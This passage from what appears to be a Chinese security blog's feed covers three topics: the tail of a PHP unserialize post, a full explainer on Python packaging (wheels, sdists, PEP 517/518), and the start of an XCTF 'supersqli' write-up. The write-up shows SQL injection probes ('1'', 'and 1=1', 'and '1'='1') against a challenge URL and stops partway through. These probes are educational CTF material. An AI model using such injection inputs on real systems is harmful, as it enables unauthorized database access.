<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;test&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;winny&quot;;s:9:&quot;testage&quot;;s:1:&quot;8&quot;;s:6:&quot;*sex&quot;;s:6:&quot;female&quot;;&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><p><code>private</code> 分析：<br>这样就发现本来是 <code>age</code>结果上面出现的是 <code>testage</code>，而且 <code>testage</code> 长度为7，但是上面显示的是9<br>查找资料后发现 <code>private</code> 属性序列化的时候格式是 <strong>%00类名%00成员名</strong>，**%00** 占一个字节长度，所以 <code>age</code> 加了类名后变成了 <code>testage</code> 长度为9</p>
</li>
<li><p><code>protect</code> 分析：<br>本来是 <code>sex</code> 结果上面出现的是 <code>*sex</code>，而且 <code>*sex</code> 的长度是4，但是上面显示的是6，同样查找资料后发现 <code>protect</code>属性序列化的时候格式<em><em>是 %00</em>%00成员名</em>*</p>
<blockquote>
<p>public(公共的):在本类内部、外部类、子类都可以访问<br>protect(受保护的):只有本类或子类或父类中可以访问<br>private(私人的):只有本类内部可以使用</p>
</blockquote>
</li>
</ul>
<p>这里我开始是采用手动序列化，一直没有成功。本菜狗还是使用脚本输出吧呜呜呜。</p>
]]></content>
      <tags>
        <tag>Web</tag>
        <tag>unserialize</tag>
      </tags>
  </entry>
  <entry>
    <title>Python软件包安装过程</title>
    <url>/2021/12/10/Python%E8%BD%AF%E4%BB%B6%E5%8C%85%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="Python软件包安装过程"><a href="#Python软件包安装过程" class="headerlink" title="Python软件包安装过程"></a>Python软件包安装过程</h1><p>我们先从一个打包的示例说起。</p>
<h2 id="一个示例"><a href="#一个示例" class="headerlink" title="一个示例"></a>一个示例</h2><p>此处的示例来源于<a class="link"   href="https://bernat.tech/posts/pep-517-and-python-packaging/" >BERNAT GABOR<i class="fas fa-external-link-alt"></i></a>，且代码可以在<a class="link"   href="https://github.com/gaborbernat" >此处<i class="fas fa-external-link-alt"></i></a>找到</p>
<p>这是一个名为pugs的包，且只包含一个名为<code>logic</code>的模块。下面是源码树<code>source tree</code>）的简单示例结构。</p>
<blockquote>
<p>pugs-project<br>├── README.rst<br>├── setup.cfg<br>├── setup.py<br>├── LICENSE.txt<br>├── src<br>│   └── pugs<br>│       ├── __init__.py<br>│       └── logic.py<br>├── tests<br>│   ├── test_init.py<br>│   └── test_logic.py<br>├── tox.ini<br>└── azure-pipelines.yml</p>
</blockquote>
<p>在理想的情况下，我们想要能够通过<code>import</code>来直接导入这个模块，并使用其中的函数，下面对各部分做一个简单的介绍。</p>
<ul>
<li>业务逻辑代码（src 文件夹中的内容）</li>
<li>测试代码（tests 文件夹和 tox.ini）</li>
<li>包代码和元数据（setup.py、setup.cfg、LICENSE.txt、README.rst — 请注意，我们如今使用的是事实上的标准打包工具<a class="link"   href="https://pypi.org/project/setuptools/" >setuptools<i class="fas fa-external-link-alt"></i></a>)</li>
<li>有助于项目管理和维护的文件：<ul>
<li>持续集成（azure-pipelines.yml）</li>
<li>版本控制（.git）</li>
<li>项目管理（例如潜在的 .github 文件夹）</li>
</ul>
</li>
</ul>
<p>我们想要达到的效果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Python 3.7.2 (v3.7.2:9a3ffc0492, Dec 24 2018, 02:44:43)</span><br><span class="line">[Clang 6.0 (clang-600.0.57)] on darwin</span><br><span class="line">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</span><br><span class="line">&gt;&gt;&gt; import pugs</span><br><span class="line">&gt;&gt;&gt; pugs.do_tell()</span><br><span class="line">&quot;An enlightened pug knows how to make the best of whatever he has to work with - A Pug&#39;s Guide to Dating -  Gemma Correll&quot;</span><br></pre></td></tr></table></figure>

<h2 id="包的可用性"><a href="#包的可用性" class="headerlink" title="包的可用性"></a>包的可用性</h2><p>我们怎么知道一个瓶子是否拧的开呢？尝试着去拧一下就知道了。Python加载包也是同理，它尝试加载包，并动态地检查其是否可用。但是与前面例子不同的，也许瓶子拧不开我们还可以尝试其他方法，一个包不可用就是不可用 :(</p>
<p>它从哪里加载？有许多可能的位置，但是在大多数情况下，我们说的是从文件系统的文件夹中加载。这个文件夹在哪里呢？对于给定的模块，可以打印该模块的表示（representation）来找出：</p>
<p>我们来尝试加载一下<code>pugs</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; import pugs</span><br><span class="line">&gt;&gt;&gt; pugs</span><br><span class="line">&lt;module &#39;pugs&#39; from &#39;&#x2F;Users&#x2F;bernat&#x2F;Library&#x2F;Python&#x2F;3.7&#x2F;lib&#x2F;python&#x2F;site-packages&#x2F;pugs&#x2F;__init__.py&#39;&gt;</span><br><span class="line">&#96;&#96;&#96;    </span><br><span class="line"></span><br><span class="line">文件夹的位置取决于：</span><br><span class="line">* 软件包的类型（三方库或者标准库的内置&#x2F;aka部分）</span><br><span class="line">* 它是全局的或仅限于当前的用户（请参阅[PEP-370](https:&#x2F;&#x2F;www.python.org&#x2F;dev&#x2F;peps&#x2F;pep-0370&#x2F;)）</span><br><span class="line">* 以及它是系统 Python 还是一个虚拟环境</span><br><span class="line"></span><br><span class="line">~~下面部分略过不影响阅读~~</span><br><span class="line">&gt; PEP 370 -- Per user site-packages directory</span><br><span class="line">**Abstract**</span><br><span class="line">This PEP proposes a new a per user site-packages directory to allow users the local installation of Python packages in their home directory.</span><br><span class="line">**Rationable**</span><br><span class="line">Current Python versions don&#39;t have a unified way to install packages into the home directory of a user (except for Mac Framework builds). Users are either forced to ask the system administrator to install or update a package for them or to use one of the many workarounds like Virtual Python [1], Working Env [2] or Virtual Env [3].</span><br><span class="line">It&#39;s not the goal of the PEP to replace the tools or to implement isolated installations of Python. It only implements the most common use case of an additional site-packages directory for each user.</span><br><span class="line">The feature can&#39;t be implemented using the environment variable PYTHONPATH. The env var just inserts a new directory to the beginning of sys.path but it doesn&#39;t parse the pth files in the directory. A full blown site-packages path is required for several applications and Python eggs.</span><br><span class="line">**Specification**</span><br><span class="line">1: _site directory (site-packages)_ : A directory in sys.path. In contrast to ordinary directories the pth files in the directory are processed, too.</span><br><span class="line">2: _user site directory_ : A site directory inside the users&#39; home directory. A user site  directory is specific to a Python version. The path contains the version number (major and minor only).</span><br><span class="line">    &#96;Unix (including Mac OS X)&#96; : ~&#x2F;.local&#x2F;lib&#x2F;python2.6&#x2F;site-packages</span><br><span class="line">    &#96;Windows&#96; : %APPDATA%&#x2F;Python&#x2F;Python26&#x2F;site-packages</span><br><span class="line">3: _user data directory_ : Usually the parent directory of the user site directory. It&#39;s meant for Python version specific data like config files, docs, images and translations.</span><br><span class="line">    &#96;Unix (including Mac)&#96; : ~&#x2F;.local&#x2F;lib&#x2F;python2.6</span><br><span class="line">    &#96;Windows&#96; : %APPDATA%&#x2F;Python&#x2F;Python26</span><br><span class="line">4: _user base directory_ : It&#39;s located inside the user&#39;s home directory. The user site and use config directory are inside the base directory. On some systems the directory may be shared with 3rd party apps.</span><br><span class="line">    &#96;Unix (including Mac)&#96; : ~&#x2F;.local</span><br><span class="line">    &#96;Windows&#96; : %APPDATA%&#x2F;Python </span><br><span class="line">5: _user script directory_ : A directory for binaries and scripts. [10] It&#39;s shared across Python versions and the destination directory for scripts.</span><br><span class="line">    &#96;Unix (including Mac)&#96; : ~&#x2F;.local&#x2F;bin</span><br><span class="line">    &#96;Windows&#96; : %APPDATA%&#x2F;Python&#x2F;Scripts</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">打印一下&#96;sys.path&#96;变量的内容</span><br></pre></td></tr></table></figure>
<blockquote>
<blockquote>
<blockquote>
<p>import sys<br>print(‘\n’.join(sys.path))<br>/Library/Frameworks/Python.framework/Versions/3.7/lib/python37.zip<br>/Library/Frameworks/Python.framework/Versions/3.7/lib/python3.7<br>/Library/Frameworks/Python.framework/Versions/3.7/lib/python3.7/lib-dynload<br>/Users/bernat/Library/Python/3.7/lib/python/site-packages<br>/Library/Frameworks/Python.framework/Versions/3.7/lib/python3.7/site-packages</p>
</blockquote>
</blockquote>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">对于第三方软件包，会是一些&#96;site-packages&#96;文件夹。在以上示例中，有些是在整个系统范围内，有些仅属于一个特定的用户。</span><br><span class="line"></span><br><span class="line">从打包到包在用户的机器上运行经历了怎样的一个过程？</span><br><span class="line"></span><br><span class="line">![](https:&#x2F;&#x2F;bernat.tech&#x2F;posts&#x2F;pep-517-and-python-packaging&#x2F;diagram.webp)</span><br><span class="line"></span><br><span class="line">1. 开发者在文件夹（称为源码树，上文提及的&#96;source tree&#96;）内编写一些 Python 代码。</span><br><span class="line">2. 然后，某些工具（例如&#96;setuptools&#96;）将源码树打包以进行重新分发。</span><br><span class="line">3. 生成的软件包通过另一个工具（&#96;twine&#96;），上传到可以被终端用户计算机访问的中央存储仓（如PyPI，但也可能是公司内的）。</span><br><span class="line">4. 终端用户计算机使用一些安装程序来查找、下载和安装相关软件包。安装操作最终是在 &#96;site-packages&#96;文件夹内，创建正确的目录结构和元数据。</span><br><span class="line"></span><br><span class="line">## Python包的类型</span><br><span class="line"></span><br><span class="line">安装时，软件包会生成至少两种类型的内容，以放入&#96;site-packages&#96;中：有关软件包内容的元数据文件夹，其中包含 &#123;package&#125;-&#123;version&#125; .dist-info 和业务逻辑文件（上文我们提到的src文件夹）。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>/Users/bgabor8/Library/Python/3.7/lib/python/site-packages/pugs<br>├── <strong>init</strong>.py<br>├── <strong>pycache</strong><br>│   ├── <strong>init</strong>.cpython-37.pyc<br>│   └── logic.cpython-37.pyc<br>└── logic.py<br>/Users/bgabor8/Library/Python/3.7/lib/python/site-packages/pugs-0.0.1.dist-info<br>├── INSTALLER<br>├── LICENSE.txt<br>├── METADATA<br>├── RECORD<br>├── WHEEL<br>├── top_level.txt<br>└── zip-safe</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">发行信息（dist-info）文件夹描述了该软件包：用于安装该软件包的安装程序、该软件包所附的许可证、在安装过程中创建的文件、顶层&#96;Python&#96;软件包是什么、该软件包的入口点等等。</span><br><span class="line"></span><br><span class="line">各种文件的详细说明位于[PEP-427](https:&#x2F;&#x2F;www.python.org&#x2F;dev&#x2F;peps&#x2F;pep-0427&#x2F;)</span><br><span class="line"></span><br><span class="line">&gt; File contents</span><br><span class="line">The contents of a wheel file, where &#123;distribution&#125; is replaced with the name of the package, e.g. beaglevote and &#123;version&#125; is replaced with its version, e.g. 1.0.0, consist of:</span><br><span class="line">&gt; 1. &#x2F;, the root of the archive, contains all files to be installed in purelib or platlib as specified in WHEEL. purelib and platlib are usually both site-packages.</span><br><span class="line">&gt; 2. &#123;distribution&#125;-&#123;version&#125;.dist-info&#x2F; contains metadata.</span><br><span class="line">&gt; 3. &#123;distribution&#125;-&#123;version&#125;.data&#x2F; contains one subdirectory for each non-empty install scheme key not already covered, where the subdirectory name is an index into a dictionary of install paths (e.g. data, scripts, include, purelib, platlib).</span><br><span class="line">&gt; 4. Python scripts must appear in scripts and begin with exactly b&#39;#!python&#39; in order to enjoy script wrapper generation and #!python rewriting at install time. They may have any or no extension.</span><br><span class="line">&gt; 5. &#123;distribution&#125;-&#123;version&#125;.dist-info&#x2F;METADATA is Metadata version 1.1 or greater format metadata.</span><br><span class="line">&gt; 6. &#123;distribution&#125;-&#123;version&#125;.dist-info&#x2F;WHEEL is metadata about the archive itself in the same basic key: value format:</span><br><span class="line">    Wheel-Version: 1.0</span><br><span class="line">    Generator: bdist_wheel 1.0</span><br><span class="line">    Root-Is-Purelib: true</span><br><span class="line">    Tag: py2-none-any</span><br><span class="line">    Tag: py3-none-any</span><br><span class="line">    Build: 1</span><br><span class="line">&gt; 7. Wheel-Version is the version number of the Wheel specification.</span><br><span class="line">&gt; 8. Generator is the name and optionally the version of the software that produced the archive.</span><br><span class="line">&gt; 9. Root-Is-Purelib is true if the top level directory of the archive should be installed into purelib; otherwise the root should be installed into platlib.</span><br><span class="line">&gt; 10. Tag is the wheel&#39;s expanded compatibility tags; in the example the filename would contain py2.py3-none-any.</span><br><span class="line">&gt; 11. Build is the build number and is omitted if there is no build number.</span><br><span class="line">&gt; 12. A wheel installer should warn if Wheel-Version is greater than the version it supports, and must fail if Wheel-Version has a greater major version than the version it supports.</span><br><span class="line">&gt; 13. Wheel, being an installation format that is intended to work across multiple versions of Python, does not generally include .pyc files.</span><br><span class="line">&gt; 14. Wheel does not contain setup.py or setup.cfg.</span><br><span class="line"></span><br><span class="line">我们如何从源码树中获得这两种类型的内容呢？有两种方法：</span><br><span class="line">1. 从我们的源码树生成此目录结构和元数据，将其压缩为单个文件，然后将其发布到中央软件包存储仓。在这种情况下，安装程序必须下载软件包并将其解压到&#96;site-packages&#96;文件夹中。我们将这种类型的包称为&#96;wheel&#96;包。</span><br><span class="line">2. 或者，你可以创建一个包含软件包源码的归档文件，构建所需的脚本和元数据，以生成可安装的（installable）目录结构，然后将其上传到中央存储仓。这称为源码分发或&#96;sdist&#96;。在这种情况下，安装程序还有很多工作要做，它需要解压归档文件，运行构建器，然后再将其复制。</span><br><span class="line"></span><br><span class="line">两个方法的不同点就是包的编译&#x2F;构建过程发生在谁的机器上，是开发者还是用户。如果是&#96;wheel&#96;文件的话，用户只需要下载解压就行了。</span><br><span class="line"></span><br><span class="line">我们尝试站在用户的位置，如果我们使用&#96;setuptools&#96;作为构建的工具，从源码树生成要放入&#96;site-packages&#96;文件夹中的内容，要确保能够成功构建，还需要要求正确的&#96;setuptools&#96;版本。</span><br><span class="line"></span><br><span class="line">要考虑的另一种情况是&#96;Python&#96;提供了从其内部访问&#96;C&#x2F;C++&#96;库的能力（在需要的地方获得额外的性能）。这样的软件包被称为 &#96;C&#96;扩展包（C-extension packages），因为它们利用了&#96;CPython&#96;提供的&#96;C&#96;扩展&#96;API&#96;。这些扩展需要编译&#96;C&#x2F;C++&#96;，才能适用与其交互的&#96;C&#x2F;C++&#96;库和当前&#96;Python&#96;解释器的&#96;C-API&#96;库。在这些情况下，构建操作实际上涉及到调用一个二进制编译器，而不仅仅是像纯&#96;Python&#96;包（例如我们的&#96;pugs&#96;库）那样，生成元数据和文件夹结构。</span><br><span class="line"></span><br><span class="line">如此看来，选择将&#96;package&#96;打包成&#96;wheel&#96;或许是一个更好的选择，但是也存在一些使用源发行版的情况：</span><br><span class="line"></span><br><span class="line">1. C 扩展的源发行版往往更易于审核，因为人们可以阅读源代码，从而在其内容上有更高的透明度：许多大型公司的环境出于此单一原因，更倾向于使用 wheel（它们通常会将此扩展到纯 Python wheel，主要是为了避免对哪些是纯 Python 和什么不是做分类）。</span><br><span class="line">2. 我们可能无法为每个可能的平台都提供一个&#96;wheel&#96;（在使用 C 扩展包的情况下，尤其如此），在这种情况下，源发行版可以让这些平台自行生成&#96;wheel&#96;。</span><br><span class="line"></span><br><span class="line">## 更深一步</span><br><span class="line"></span><br><span class="line">目前我们已经了解了三种类型的包：源码树（&#96;source tree&#96;）、源发行版（&#96;source distribution&#96;）和&#96;wheel&#96;，我们从&#96;PyPi&#96;上获取的是通常是后两种包。</span><br><span class="line"></span><br><span class="line">### 构建Python包</span><br><span class="line"></span><br><span class="line">我们再简单回顾以下包管理工具的历史。</span><br><span class="line"></span><br><span class="line">&#96;distutils&#96;是&#96;python&#96;标准库的一部分，2000年发布。使用它能够进行&#96;python&#96;模块的安装和发布。</span><br><span class="line">&#96;setup.py&#96;就是利用&#96;distutils&#96;的功能写成。</span><br><span class="line"></span><br><span class="line">&#96;setuptools&#96;是一个为了增强&#96;distutils&#96;而开发的集合，2004年发布。它包含了&#96;easy_install&#96;这个工具。</span><br><span class="line"></span><br><span class="line">&#96;pip&#96;是目前&#96;python&#96;包管理的事实标准，2008年发布。它被用作 &#96;easy_install&#96;的替代品，但是它仍有大量的功能建立在&#96;setuptools&#96;组件之上。</span><br><span class="line"></span><br><span class="line">而&#96;whl&#96;则于2012年在[PEP427](https:&#x2F;&#x2F;www.python.org&#x2F;dev&#x2F;peps&#x2F;pep-0427&#x2F;)中定义。在此之前所有的包都是源发行版。</span><br><span class="line"></span><br><span class="line">#### 构建依赖项</span><br><span class="line">安装一个源发行包，pip做了以下工作：</span><br><span class="line"></span><br><span class="line">1. 找到这个包</span><br><span class="line">2. 下载源发行版并提取它</span><br><span class="line">3. 在提取的文件夹上运行&#96;python setup.py install&#96;（进行构建+安装）</span><br><span class="line"></span><br><span class="line">开发者在这个过程中，通过&#96;python setup.py sdist&#96;生成分发包，然后运行&#96;python setup.py upload&#96;上传到中央存储仓库（该命令在201 年被弃用，因为有&#96;twine&#96;，更主要是因为&#96;upload&#96;使用了不安全的 &#96;HTTP&#96;连接，而且上传命令会做一次新的构建，也就不允许最终用户在实际上传之前检测（inspect）生成的包）。</span><br><span class="line"></span><br><span class="line">当我们运行&#96;python setup.py install&#96;时，此时使用的是&#96;Python&#96;解释器来安装包。因此，在构建的过程中可以访问该解释器中已经存在的所有三方包。最值得注意的是，它使用的是安装在主机&#96;Python&#96;解释器上的&#96;setuptools&#96;。如果一个包使用了新版本的&#96;setuptools&#96;，那么需要更新&#96;setuptools&#96;。</span><br><span class="line"></span><br><span class="line">同时构建器也可能使用其他辅助包(如&#96;cpython&#96;)，如果缺少构建器的辅助，则可能会抛出以下错误</span><br></pre></td></tr></table></figure>
<p>File “setup_build.py”, line 99, in run<br>    from Cython.Build import cythonize<br>ImportError: No module named Cython.Build</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">开发者没有办法给提供这些构建依赖项，则需要用户来安装所有的包构建依赖，也许这些包在运行的过程中并不会被使用到。</span><br><span class="line"></span><br><span class="line">让我们来看看[PEP-518](https:&#x2F;&#x2F;www.python.org&#x2F;dev&#x2F;peps&#x2F;pep-0518&#x2F;)</span><br><span class="line"></span><br><span class="line">&gt; Using an executable file to specify build requirements under distutils isn&#39;t an issue as distutils is part of Python&#39;s standard library. Having the build tool as part of Python means that a setup.py has no external dependency that a project maintainer needs to worry about to build a distribution of their project. There was no need to specify any dependency information as the only dependency is Python.</span><br><span class="line">But when a project chooses to use setuptools, the use of an executable file like setup.py becomes an issue. You can&#39;t execute a setup.py file without knowing its dependencies, but currently there is no standard way to know what those dependencies are in an automated fashion without executing the setup.py file where that information is stored. It&#39;s a catch-22 of a file not being runnable without knowing its own contents which can&#39;t be known programmatically unless you run the file.</span><br><span class="line">Setuptools tried to solve this with a setup_requires argument to its setup() function. This solution has a number of issues, such as:</span><br><span class="line">&gt; * No tooling (besides setuptools itself) can access this information without executing the setup.py, but setup.py can&#39;t be executed without having these items installed.</span><br><span class="line">&gt; * While setuptools itself will install anything listed in this, they won&#39;t be installed until during the execution of the setup() function, which means that the only way to actually use anything added here is through increasingly complex machinations that delay the import and usage of these modules until later on in the execution of the setup() function.</span><br><span class="line">&gt; * This cannot include setuptools itself nor can it include a replacement to setuptools, which means that projects such as numpy.distutils are largely incapable of utilizing it and projects cannot take advantage of newer setuptools features until their users naturally upgrade the version of setuptools to a newer one.</span><br><span class="line">&gt; * The items listed in setup_requires get implicitly installed whenever you execute the setup.py but one of the common ways that the setup.py is executed is via another tool, such as pip, who is already managing dependencies. This means that a command like &#96;pip install spam&#96; might end up having both pip and setuptools downloading and installing packages and end users needing to configure both tools (and for setuptools without being in control of the invocation) to change settings like which repository it installs from. It also means that users need to be aware of the discovery rules for both tools, as one may support different package formats or determine the latest version differently. </span><br><span class="line"></span><br><span class="line">针对一系列问题，与其将主机的&#96;Python&#96;与其当前安装的构建包一起使用，不如给软件包提供一种能力，令其清楚地说明其构建操作所需的内容。另外，与其在主机&#96;Python&#96;上提供此功能，不如创建了一个独立的&#96;Python&#96;（类似某种虚拟环境）来运行打包。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#96;python setup.py install &#96;进行了以下操作：</span><br><span class="line">1. 创建一个临时文件夹</span><br><span class="line">2. 创建一个隔离的（从三方库的&#96;site-packages&#96;中）&#96;Python&#96;环境&#96;python -m virtualenv our_build_env&#96;，让我们将这个 Python 可执行文件称为python_isolated</span><br><span class="line">3. 安装构建的依赖项</span><br><span class="line">4. 通过&#96;python_isolated setup.py bdist_wheel&#96;，生成一个用于安装的&#96;wheel&#96;</span><br><span class="line">5. 提取&#96;wheel&#96;到&#96;Python&#96;的&#96;site-packages&#96;文件夹</span><br><span class="line"></span><br><span class="line">这样一来，我们就可以安装之前提到过的基于&#96;cython&#96;的包，而不必在运行的&#96;Python&#96;环境中安装&#96;cython&#96;。添加依赖项的元数据文件&#96;pyproject.toml&#96;如下</span><br></pre></td></tr></table></figure>
<p>[build-system]<br>requires = [<br>    “setuptools &gt;= 40.8.0”,<br>    “wheel &gt;= 0.30.0”,<br>    “cython &gt;= 0.29.4”,<br>]</p>
<p>```<br>同理，开发者也可以利用这样的机制。</p>
<p>参考链接：</p>
<ol>
<li><a class="link"   href="https://medium.com/@chinesehuazhou/python-%E6%89%93%E5%8C%85%E7%9A%84%E7%8E%B0%E7%8A%B6-%E5%8C%85%E7%9A%84%E4%B8%89%E7%A7%8D%E7%B1%BB%E5%9E%8B-93db7b8fe92f" >https://medium.com/@chinesehuazhou/python-%E6%89%93%E5%8C%85%E7%9A%84%E7%8E%B0%E7%8A%B6-%E5%8C%85%E7%9A%84%E4%B8%89%E7%A7%8D%E7%B1%BB%E5%9E%8B-93db7b8fe92f<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://bernat.tech/posts/pep-517-and-python-packaging/" >https://bernat.tech/posts/pep-517-and-python-packaging/<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://bernat.tech/posts/pep-517-518/" >https://bernat.tech/posts/pep-517-518/<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://medium.com/@chinesehuazhou/python-%E6%89%93%E5%8C%85-%E8%BF%87%E5%8E%BB-%E7%8E%B0%E5%9C%A8%E4%B8%8E%E6%9C%AA%E6%9D%A5-7ee511a2949" >https://medium.com/@chinesehuazhou/python-%E6%89%93%E5%8C%85-%E8%BF%87%E5%8E%BB-%E7%8E%B0%E5%9C%A8%E4%B8%8E%E6%9C%AA%E6%9D%A5-7ee511a2949<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://www.python.org/dev/peps/pep-0370/" >https://www.python.org/dev/peps/pep-0370/<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://www.python.org/dev/peps/pep-0427/" >https://www.python.org/dev/peps/pep-0427/<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://pypi.org/project/twine/" >https://pypi.org/project/twine/<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://www.python.org/dev/peps/pep-0518/" >https://www.python.org/dev/peps/pep-0518/<i class="fas fa-external-link-alt"></i></a></li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>XCTF-supersqli</title>
    <url>/2020/08/13/XCTF-supersqli/</url>
    <content><![CDATA[<h1 id="题目描述随便注"><a href="#题目描述随便注" class="headerlink" title="题目描述随便注"></a>题目描述随便注</h1><p><img src="https://img-blog.csdnimg.cn/20200806202519863.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTYxMzc2MA==,size_16,color_FFFFFF,t_70"></p>
<h1 id="打开链接，查看源码"><a href="#打开链接，查看源码" class="headerlink" title="打开链接，查看源码"></a>打开链接，查看源码</h1><p><img src="https://img-blog.csdnimg.cn/20200806202600101.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTYxMzc2MA==,size_16,color_FFFFFF,t_70"><br><img src="https://img-blog.csdnimg.cn/20200806202625479.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTYxMzc2MA==,size_16,color_FFFFFF,t_70"><br>看来没办法使用sqlmap了，采用手注⑧</p>
<h1 id="判断是否存在sql注入漏洞"><a href="#判断是否存在sql注入漏洞" class="headerlink" title="判断是否存在sql注入漏洞"></a>判断是否存在sql注入漏洞</h1><p>最为经典的一种判断方法是单引号判断法<br>即在参数后面加上单引号，如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.133:53805&#x2F;?inject&#x3D;1&#39;</span><br></pre></td></tr></table></figure>
<p>如果页面返回错误，则存在sql注入<br>原因是字符型或者是整型都会因为单引号个数不匹配而报错</p>
<p>尝试注入，的确存在注入漏洞<br><img src="https://img-blog.csdnimg.cn/20200806203536873.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTYxMzc2MA==,size_16,color_FFFFFF,t_70"></p>
<h1 id="判断注入漏洞的类型"><a href="#判断注入漏洞的类型" class="headerlink" title="判断注入漏洞的类型"></a>判断注入漏洞的类型</h1><p>注入漏洞分为两种类型</p>
<ul>
<li>数字型</li>
<li>字符型</li>
</ul>
<h2 id="数字型判断"><a href="#数字型判断" class="headerlink" title="数字型判断"></a>数字型判断</h2><p>数字型sql语句一般如下</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="operator">&lt;</span>table_name<span class="operator">&gt;</span> <span class="keyword">where</span> inject <span class="operator">=</span>  x</span><br></pre></td></tr></table></figure>
<p>可以通过and 1=1 和 and 1=2进行判断</p>
<ul>
<li>在url中输入<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.133:53805&#x2F;?inject&#x3D;1 and 1&#x3D;1</span><br></pre></td></tr></table></figure>
返回正常，接着下一步<br><img src="https://img-blog.csdnimg.cn/20200806204316427.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTYxMzc2MA==,size_16,color_FFFFFF,t_70"></li>
<li>在url中输入<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.133:53805&#x2F;?inject&#x3D;1 and 1&#x3D;2</span><br></pre></td></tr></table></figure>
如果返回错误，即说明为数字型注入</li>
</ul>
<p> 尝试后发现仍然正常，说明该处不是数字型注入<br> <img src="https://img-blog.csdnimg.cn/20200806204642360.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTYxMzc2MA==,size_16,color_FFFFFF,t_70"><br>解释一下<br>如果为数字型注入，当输入<code>and 1=1</code>时，执行的sql语句如下</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="operator">&lt;</span>table_name<span class="operator">&gt;</span> <span class="keyword">where</span> inject<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>无语法错误且逻辑判断为真，返回正常</p>
<p>当输入<code>and 1=2</code>时，执行的sql语句如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from &lt;table_name&gt; where inject&#x3D;1 and 1&#x3D;2</span><br></pre></td></tr></table></figure>
<p>无语法错误但逻辑判断为假，返回错误</p>
<p>如果此题为字符型注入，产生的sql语句如下</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="operator">&lt;</span>table_name<span class="operator">&gt;</span> <span class="keyword">where</span> inject<span class="operator">=</span> <span class="string">&#x27;1 and 1=1&#x27;</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="operator">&lt;</span>table_name<span class="operator">&gt;</span> <span class="keyword">where</span> inject<span class="operator">=</span> <span class="string">&#x27;1 and 1=2&#x27;</span></span><br></pre></td></tr></table></figure>
<p>这样的话并不会进行and的逻辑判断，所以这道题应该是字符型注入</p>
<h2 id="字符型判断"><a href="#字符型判断" class="headerlink" title="字符型判断"></a>字符型判断</h2><p>字符型sql语句一般如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from &lt;table_name&gt; where inject &#x3D;  &#39;x&#39;</span><br></pre></td></tr></table></figure>
<p>可以通过and ‘1’=’1 和 and ‘1’=’2进行判断</p>
<ul>
<li>在url中输入<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.133:53805&#x2F;?inject&#x3D;1&#39; and &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
返回正常，接着下一步<br><img src="https://img-blog.csdnimg.cn/20200806205613503.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTYxMzc2MA==,size_16,color_FFFFFF,t_70"></li>
